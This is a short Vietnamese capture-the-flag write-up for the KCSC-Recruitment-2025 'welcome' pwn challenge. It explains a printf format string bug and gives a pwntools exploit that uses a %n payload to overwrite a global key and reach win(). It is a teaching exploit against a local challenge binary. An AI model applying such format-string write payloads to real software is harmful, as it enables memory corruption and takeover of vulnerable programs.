Hướng dẫn cách giải bài welcome của giải KCSC-Recruitment-2025

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 28/09/2026

## 1. Mục tiêu
Đầu tiên đọc code

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  puts("Welcome to KCSC Recruitment !");
  printf("What's your name?\n> ");
  fgets(s, 64, stdin);
  printf("Hi ");
  printf(s);      // Format string
  if ( key == 4919 )
    win();
  return 0;
}
```

Bài này có lỗi là **Format String**, ta cần chỉnh `key` thành `0x1337` để nhảy vô hàm `win`. Thằng `key` nó nằm ở vùng `bss` và bài này **NO PIE** nên sẽ khá là đơn giản thôi.

## 2. Cách thực thi
```Python
from pwn import *

p = process('./chall')

key = 0x40408c

payload = f'%{4919}c%8$n'.encode()
payload = payload.ljust(16, b'\x00')
payload += p64(key)

p.sendlineafter(b"What's your name?", payload)

p.interactive()
```

Khá là basic, cổ điển tôn trọng 🐧.
